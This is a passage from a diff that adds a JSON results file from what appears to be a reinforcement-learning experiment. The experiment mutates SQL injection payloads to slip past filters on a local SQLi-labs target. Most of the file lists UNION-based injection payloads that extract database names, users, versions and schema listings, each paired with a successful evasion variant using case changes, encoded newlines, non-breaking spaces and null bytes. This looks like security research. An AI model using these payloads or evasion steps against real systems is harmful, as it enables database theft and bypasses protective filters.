@@ -1,0 +1,2007 @@
+{
+  "method": "trpo",
+  "target_url": "http://localhost:8080/Less-1/",
+  "payload_set": "payloads_union_less1.csv",
+  "n_payloads": 108,
+  "max_steps": 15,
+  "seed": 0,
+  "fnr0": 0.0,
+  "mfnr": 0.9907,
+  "ifnr": 0.9907,
+  "fnr0_source": "measured",
+  "spbarc": 6.07,
+  "total_inference_requests": 649,
+  "successful_mutated_bypasses": 107,
+  "training_requests": 0,
+  "wall_clock_seconds": 30.03,
+  "per_payload": [
+    {
+      "payload_id": "u0109",
+      "original_payload": "-1' UNION SELECT database(),'SEQSQLI_START','SEQSQLI_END'-- -",
+      "success": true,
+      "final_payload": "-1'%0aUnIoN%0asElECT%0aDATaBAse%a0(),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 4,
+      "requests_used": 5,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte"
+      ]
+    },
+    {
+      "payload_id": "u0110",
+      "original_payload": "-1' UNION ALL SELECT database(),'SEQSQLI_START','SEQSQLI_END'-- -",
+      "success": true,
+      "final_payload": "-1'%0aunION%0aALL%0aseLect%0aDAtAbaSe%a0(),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 4,
+      "requests_used": 5,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte"
+      ]
+    },
+    {
+      "payload_id": "u0111",
+      "original_payload": "-1' UNION DISTINCT SELECT database(),'SEQSQLI_START','SEQSQLI_END'-- -",
+      "success": true,
+      "final_payload": "-1'%0aUnioN%0aDISTINCT%0aSelEcT%0adATabaSe%a0(),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 4,
+      "requests_used": 5,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte"
+      ]
+    },
+    {
+      "payload_id": "u0112",
+      "original_payload": "-1' UNION DISTINCTROW SELECT database(),'SEQSQLI_START','SEQSQLI_END'-- -",
+      "success": true,
+      "final_payload": "-1'%0aUnIoN%0aDISTINCTROW%0aselECT%0adATabASE%a0(),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 4,
+      "requests_used": 5,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte"
+      ]
+    },
+    {
+      "payload_id": "u0113",
+      "original_payload": "-1' UNION SELECT database(),'SEQSQLI_START','SEQSQLI_END'#",
+      "success": true,
+      "final_payload": "-1'%0auNIon%0asELecT%0adATABaSe%a0(),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 4,
+      "requests_used": 5,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte"
+      ]
+    },
+    {
+      "payload_id": "u0114",
+      "original_payload": "-1' UNION ALL SELECT database(),'SEQSQLI_START','SEQSQLI_END'#",
+      "success": true,
+      "final_payload": "-1'%0auNION%0aALL%0aselECt%0adataBaSe%a0(),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 4,
+      "requests_used": 5,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte"
+      ]
+    },
+    {
+      "payload_id": "u0115",
+      "original_payload": "-1' UNION DISTINCT SELECT database(),'SEQSQLI_START','SEQSQLI_END'#",
+      "success": true,
+      "final_payload": "-1'%0auNIoN%0aDISTINCT%0asELECt%0adATABaSe%a0(),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 4,
+      "requests_used": 5,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte"
+      ]
+    },
+    {
+      "payload_id": "u0116",
+      "original_payload": "-1' UNION DISTINCTROW SELECT database(),'SEQSQLI_START','SEQSQLI_END'#",
+      "success": true,
+      "final_payload": "-1'%0aUNion%0aDISTINCTROW%0aseleCt%0aDAtabase%a0(),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 4,
+      "requests_used": 5,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte"
+      ]
+    },
+    {
+      "payload_id": "u0117",
+      "original_payload": "-1' UNION SELECT database(),'SEQSQLI_START','SEQSQLI_END'--+",
+      "success": true,
+      "final_payload": "-1'%0auNIOn%0asElECT%0adataBasE%a0(),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 4,
+      "requests_used": 5,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte"
+      ]
+    },
+    {
+      "payload_id": "u0118",
+      "original_payload": "-1' UNION ALL SELECT database(),'SEQSQLI_START','SEQSQLI_END'--+",
+      "success": true,
+      "final_payload": "-1'%0auNioN%0aALL%0aSELect%0adataBasE%a0(),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 4,
+      "requests_used": 5,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte"
+      ]
+    },
+    {
+      "payload_id": "u0119",
+      "original_payload": "-1' UNION DISTINCT SELECT database(),'SEQSQLI_START','SEQSQLI_END'--+",
+      "success": true,
+      "final_payload": "-1'%0aUniOn%0aDISTINCT%0aselecT%0adaTABAsE%a0(),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 4,
+      "requests_used": 5,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte"
+      ]
+    },
+    {
+      "payload_id": "u0120",
+      "original_payload": "-1' UNION DISTINCTROW SELECT database(),'SEQSQLI_START','SEQSQLI_END'--+",
+      "success": true,
+      "final_payload": "-1'%0auNioN%0aDISTINCTROW%0aSELECt%0aDATaBase%a0(),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 4,
+      "requests_used": 5,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte"
+      ]
+    },
+    {
+      "payload_id": "u0121",
+      "original_payload": "-1' UNION SELECT user(),'SEQSQLI_START','SEQSQLI_END'-- -",
+      "success": true,
+      "final_payload": "-1'%0aUniOn%0asELEcT%0auser%a0(),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 4,
+      "requests_used": 5,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte"
+      ]
+    },
+    {
+      "payload_id": "u0122",
+      "original_payload": "-1' UNION ALL SELECT user(),'SEQSQLI_START','SEQSQLI_END'-- -",
+      "success": true,
+      "final_payload": "-1'%0aUNion%0aALL%0aseLECt%0auser%a0(),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 4,
+      "requests_used": 5,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte"
+      ]
+    },
+    {
+      "payload_id": "u0123",
+      "original_payload": "-1' UNION DISTINCT SELECT user(),'SEQSQLI_START','SEQSQLI_END'-- -",
+      "success": true,
+      "final_payload": "-1'%0aUnIOn%0aDISTINCT%0aSeLEcT%0auser%a0(),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 4,
+      "requests_used": 5,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte"
+      ]
+    },
+    {
+      "payload_id": "u0124",
+      "original_payload": "-1' UNION DISTINCTROW SELECT user(),'SEQSQLI_START','SEQSQLI_END'-- -",
+      "success": true,
+      "final_payload": "-1'%0aUNion%0aDISTINCTROW%0aSElEcT%0auser%a0(),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 4,
+      "requests_used": 5,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte"
+      ]
+    },
+    {
+      "payload_id": "u0125",
+      "original_payload": "-1' UNION SELECT user(),'SEQSQLI_START','SEQSQLI_END'#",
+      "success": true,
+      "final_payload": "-1'%0aUnIOn%0aSeLeCT%0auser%a0(),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 4,
+      "requests_used": 5,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte"
+      ]
+    },
+    {
+      "payload_id": "u0126",
+      "original_payload": "-1' UNION ALL SELECT user(),'SEQSQLI_START','SEQSQLI_END'#",
+      "success": true,
+      "final_payload": "-1'%0aUniON%0aALL%0aSElEcT%0auser%a0(),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 4,
+      "requests_used": 5,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte"
+      ]
+    },
+    {
+      "payload_id": "u0127",
+      "original_payload": "-1' UNION DISTINCT SELECT user(),'SEQSQLI_START','SEQSQLI_END'#",
+      "success": true,
+      "final_payload": "-1'%0auNIOn%0aDISTINCT%0asElEcT%0auser%a0(),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 4,
+      "requests_used": 5,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte"
+      ]
+    },
+    {
+      "payload_id": "u0128",
+      "original_payload": "-1' UNION DISTINCTROW SELECT user(),'SEQSQLI_START','SEQSQLI_END'#",
+      "success": true,
+      "final_payload": "-1'%0auNION%0aDISTINCTROW%0asElect%0auser%a0(),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 4,
+      "requests_used": 5,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte"
+      ]
+    },
+    {
+      "payload_id": "u0129",
+      "original_payload": "-1' UNION SELECT user(),'SEQSQLI_START','SEQSQLI_END'--+",
+      "success": true,
+      "final_payload": "-1'%0aUnIon%0aSEleCt%0auser%a0(),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 4,
+      "requests_used": 5,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte"
+      ]
+    },
+    {
+      "payload_id": "u0130",
+      "original_payload": "-1' UNION ALL SELECT user(),'SEQSQLI_START','SEQSQLI_END'--+",
+      "success": true,
+      "final_payload": "-1'%0aunION%0aALL%0aSELect%0auser%a0(),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 4,
+      "requests_used": 5,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte"
+      ]
+    },
+    {
+      "payload_id": "u0131",
+      "original_payload": "-1' UNION DISTINCT SELECT user(),'SEQSQLI_START','SEQSQLI_END'--+",
+      "success": true,
+      "final_payload": "-1'%0aUNIOn%0aDISTINCT%0asElEcT%0auser%a0(),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 4,
+      "requests_used": 5,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte"
+      ]
+    },
+    {
+      "payload_id": "u0132",
+      "original_payload": "-1' UNION DISTINCTROW SELECT user(),'SEQSQLI_START','SEQSQLI_END'--+",
+      "success": true,
+      "final_payload": "-1'%0auNiON%0aDISTINCTROW%0aSeLECT%0auser%a0(),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 4,
+      "requests_used": 5,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte"
+      ]
+    },
+    {
+      "payload_id": "u0133",
+      "original_payload": "-1' UNION SELECT version(),'SEQSQLI_START','SEQSQLI_END'-- -",
+      "success": true,
+      "final_payload": "-1'%0aunIon%0aseLeCt%0aversion%a0(),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 4,
+      "requests_used": 5,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte"
+      ]
+    },
+    {
+      "payload_id": "u0134",
+      "original_payload": "-1' UNION ALL SELECT version(),'SEQSQLI_START','SEQSQLI_END'-- -",
+      "success": true,
+      "final_payload": "-1'%0auNIon%0aALL%0aSeLEcT%0aversion%a0(),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 4,
+      "requests_used": 5,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte"
+      ]
+    },
+    {
+      "payload_id": "u0135",
+      "original_payload": "-1' UNION DISTINCT SELECT version(),'SEQSQLI_START','SEQSQLI_END'-- -",
+      "success": true,
+      "final_payload": "-1'%0aunIon%0aDISTINCT%0aSElecT%0aversion%a0(),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 4,
+      "requests_used": 5,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte"
+      ]
+    },
+    {
+      "payload_id": "u0136",
+      "original_payload": "-1' UNION DISTINCTROW SELECT version(),'SEQSQLI_START','SEQSQLI_END'-- -",
+      "success": true,
+      "final_payload": "-1'%0aunIon%0aDISTINCTROW%0asElECt%0aversion%a0(),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 4,
+      "requests_used": 5,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte"
+      ]
+    },
+    {
+      "payload_id": "u0137",
+      "original_payload": "-1' UNION SELECT version(),'SEQSQLI_START','SEQSQLI_END'#",
+      "success": true,
+      "final_payload": "-1'%0auniOn%0aSelECt%0aversion%a0(),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 4,
+      "requests_used": 5,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte"
+      ]
+    },
+    {
+      "payload_id": "u0138",
+      "original_payload": "-1' UNION ALL SELECT version(),'SEQSQLI_START','SEQSQLI_END'#",
+      "success": true,
+      "final_payload": "-1'%0aunION%0aALL%0asELeCt%0aversion%a0(),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 4,
+      "requests_used": 5,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte"
+      ]
+    },
+    {
+      "payload_id": "u0139",
+      "original_payload": "-1' UNION DISTINCT SELECT version(),'SEQSQLI_START','SEQSQLI_END'#",
+      "success": true,
+      "final_payload": "-1'%0auNion%0aDISTINCT%0asEleCt%0aversion%a0(),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 4,
+      "requests_used": 5,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte"
+      ]
+    },
+    {
+      "payload_id": "u0140",
+      "original_payload": "-1' UNION DISTINCTROW SELECT version(),'SEQSQLI_START','SEQSQLI_END'#",
+      "success": true,
+      "final_payload": "-1'%0aunIon%0aDISTINCTROW%0aSElECt%0aversion%a0(),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 4,
+      "requests_used": 5,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte"
+      ]
+    },
+    {
+      "payload_id": "u0141",
+      "original_payload": "-1' UNION SELECT version(),'SEQSQLI_START','SEQSQLI_END'--+",
+      "success": true,
+      "final_payload": "-1'%0aUNiON%0asElEct%0aversion%a0(),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 4,
+      "requests_used": 5,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte"
+      ]
+    },
+    {
+      "payload_id": "u0142",
+      "original_payload": "-1' UNION ALL SELECT version(),'SEQSQLI_START','SEQSQLI_END'--+",
+      "success": true,
+      "final_payload": "-1'%0auNion%0aALL%0asELecT%0aversion%a0(),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 4,
+      "requests_used": 5,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte"
+      ]
+    },
+    {
+      "payload_id": "u0143",
+      "original_payload": "-1' UNION DISTINCT SELECT version(),'SEQSQLI_START','SEQSQLI_END'--+",
+      "success": true,
+      "final_payload": "-1'%0aunioN%0aDISTINCT%0aSElECt%0aversion%a0(),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 4,
+      "requests_used": 5,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte"
+      ]
+    },
+    {
+      "payload_id": "u0144",
+      "original_payload": "-1' UNION DISTINCTROW SELECT version(),'SEQSQLI_START','SEQSQLI_END'--+",
+      "success": true,
+      "final_payload": "-1'%0aUNIOn%0aDISTINCTROW%0asElEct%0aversion%a0(),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 4,
+      "requests_used": 5,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte"
+      ]
+    },
+    {
+      "payload_id": "u0145",
+      "original_payload": "-1' UNION SELECT (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),'SEQSQLI_START','SEQSQLI_END'-- -",
+      "success": true,
+      "final_payload": "-1'%0aunioN%0asELeCt%0a(sElECt%0aJSON_ARRAYAGG(tABLE_name)%0aFrOM%0aINFORMaTIon_SCHEMA.TAblEs%0awHERE%0atablE_schema=DataBASE%a0()),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 5,
+      "requests_used": 6,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte",
+        "agg_swap"
+      ]
+    },
+    {
+      "payload_id": "u0146",
+      "original_payload": "-1' UNION ALL SELECT (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),'SEQSQLI_START','SEQSQLI_END'-- -",
+      "success": true,
+      "final_payload": "-1'%0aunIon%0aALL%0aSelECT%0a(sElEct%0aJSON_ARRAYAGG(TaBLe_name)%0afroM%0aINFOrMAtiON_sChema.tABles%0awhERe%0aTAbLe_schema=DaTABasE%a0()),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 5,
+      "requests_used": 6,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte",
+        "agg_swap"
+      ]
+    },
+    {
+      "payload_id": "u0147",
+      "original_payload": "-1' UNION DISTINCT SELECT (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),'SEQSQLI_START','SEQSQLI_END'-- -",
+      "success": true,
+      "final_payload": "-1'%0auNioN%0aDISTINCT%0aSeleCT%0a(SelEcT%0aJSON_ARRAYAGG(tabLE_name)%0afrom%0aINFOrMatioN_sCHema.taBles%0aWHeRE%0aTABLe_schema=DAtaBAse%a0()),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 5,
+      "requests_used": 6,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte",
+        "agg_swap"
+      ]
+    },
+    {
+      "payload_id": "u0148",
+      "original_payload": "-1' UNION DISTINCTROW SELECT (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),'SEQSQLI_START','SEQSQLI_END'-- -",
+      "success": true,
+      "final_payload": "-1'%0aUNion%0aDISTINCTROW%0aSeLeCT%0a(selEct%0aJSON_ARRAYAGG(tABLe_name)%0aFrOm%0aiNfoRmaTIoN_sCHEma.tABles%0awheRE%0aTaBle_schema=DaTaBaSe%a0()),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 5,
+      "requests_used": 6,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte",
+        "agg_swap"
+      ]
+    },
+    {
+      "payload_id": "u0149",
+      "original_payload": "-1' UNION SELECT (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),'SEQSQLI_START','SEQSQLI_END'#",
+      "success": true,
+      "final_payload": "-1'%0auNION%0aSeleCT%0a(sElEct%0aJSON_ARRAYAGG(tAblE_name)%0afrOM%0aiNfoRMATIon_sChemA.TABles%0awhere%0aTaBLE_schema=DatAbase%a0()),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 5,
+      "requests_used": 6,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte",
+        "agg_swap"
+      ]
+    },
+    {
+      "payload_id": "u0150",
+      "original_payload": "-1' UNION ALL SELECT (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),'SEQSQLI_START','SEQSQLI_END'#",
+      "success": true,
+      "final_payload": "-1'%0aUnIOn%0aALL%0aSeleCT%0a(SeLeCt%0aJSON_ARRAYAGG(TABLE_name)%0aFrOm%0aInFORmATiON_sCHEMa.TAbLEs%0aWHERe%0aTaBlE_schema=dATaBaSe%a0()),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 5,
+      "requests_used": 6,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte",
+        "agg_swap"
+      ]
+    },
+    {
+      "payload_id": "u0151",
+      "original_payload": "-1' UNION DISTINCT SELECT (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),'SEQSQLI_START','SEQSQLI_END'#",
+      "success": true,
+      "final_payload": "-1'%0auNion%0aDISTINCT%0aseLect%0a(SeLEct%0aJSON_ARRAYAGG(Table_name)%0aFrOM%0aINFOrmaTIOn_SChEma.TabLEs%0aWHEre%0atable_schema=databaSe%a0()),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 5,
+      "requests_used": 6,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte",
+        "agg_swap"
+      ]
+    },
+    {
+      "payload_id": "u0152",
+      "original_payload": "-1' UNION DISTINCTROW SELECT (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),'SEQSQLI_START','SEQSQLI_END'#",
+      "success": true,
+      "final_payload": "-1'%0aUniOn%0aDISTINCTROW%0aselEct%0a(SELECt%0aJSON_ARRAYAGG(tabLe_name)%0afRom%0aInfORMaTiOn_SCheMa.tAbLes%0aWHeRe%0aTAble_schema=dataBASE%a0()),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 5,
+      "requests_used": 6,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte",
+        "agg_swap"
+      ]
+    },
+    {
+      "payload_id": "u0153",
+      "original_payload": "-1' UNION SELECT (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),'SEQSQLI_START','SEQSQLI_END'--+",
+      "success": true,
+      "final_payload": "-1'%0aUNiON%0aselecT%0a(sELECt%0aJSON_ARRAYAGG(TablE_name)%0afROm%0ainfORmATion_sChEMA.Tables%0aWhErE%0atAblE_schema=dAtABaSE%a0()),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 5,
+      "requests_used": 6,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte",
+        "agg_swap"
+      ]
+    },
+    {
+      "payload_id": "u0154",
+      "original_payload": "-1' UNION ALL SELECT (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),'SEQSQLI_START','SEQSQLI_END'--+",
+      "success": true,
+      "final_payload": "-1'%0aunIoN%0aALL%0aSeLECt%0a(selECT%0aJSON_ARRAYAGG(tabLE_name)%0afRoM%0aINFORmAtioN_ScHemA.TAbLes%0awhErE%0aTablE_schema=DAtaBaSE%a0()),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 5,
+      "requests_used": 6,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte",
+        "agg_swap"
+      ]
+    },
+    {
+      "payload_id": "u0155",
+      "original_payload": "-1' UNION DISTINCT SELECT (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),'SEQSQLI_START','SEQSQLI_END'--+",
+      "success": true,
+      "final_payload": "-1'%0aunioN%0aDISTINCT%0aSeLEct%0a(SeLEcT%0aJSON_ARRAYAGG(TaBLe_name)%0aFROM%0aINFoRmAtION_ScHEma.TAblEs%0aWheRe%0atabLe_schema=DAtaBAsE%a0()),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 5,
+      "requests_used": 6,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte",
+        "agg_swap"
+      ]
+    },
+    {
+      "payload_id": "u0156",
+      "original_payload": "-1' UNION DISTINCTROW SELECT (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),'SEQSQLI_START','SEQSQLI_END'--+",
+      "success": true,
+      "final_payload": "-1'%0aUNion%0aDISTINCTROW%0aselEct%0a(sElecT%0aJSON_ARRAYAGG(TAbLE_name)%0aFRoM%0aINFoRmATion_sCheMa.TaBLes%0awHeRE%0aTABle_schema=daTabAse%a0()),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 5,
+      "requests_used": 6,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte",
+        "agg_swap"
+      ]
+    },
+    {
+      "payload_id": "u0157",
+      "original_payload": "-1' UNION SELECT (SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata),'SEQSQLI_START','SEQSQLI_END'-- -",
+      "success": true,
+      "final_payload": "-1'%0aUnION%0aselecT%0a(SelECT%0aJSON_ARRAYAGG(schema_name)%0afROm%0aInFORmatioN_SChEMA.schemata),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 5,
+      "requests_used": 5,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte",
+        "agg_swap"
+      ]
+    },
+    {
+      "payload_id": "u0158",
+      "original_payload": "-1' UNION ALL SELECT (SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata),'SEQSQLI_START','SEQSQLI_END'-- -",
+      "success": true,
+      "final_payload": "-1'%0auNioN%0aALL%0aSELECt%0a(SEleCT%0aJSON_ARRAYAGG(schema_name)%0afRom%0ainFORmATIon_scHeMA.schemata),'SEQSQLI_START','SEQSQLI_END';%00",
+      "steps": 5,
+      "requests_used": 5,
+      "final_status": 200,
+      "final_result": "SUCCESS",
+      "initial_bypass": false,
+      "sequence": [
+        "case",
+        "newline",
+        "func_sp_nbsp",
+        "null_byte",
+        "agg_swap"
+      ]
+    },
+    {
+      "payload_id": "u0159",
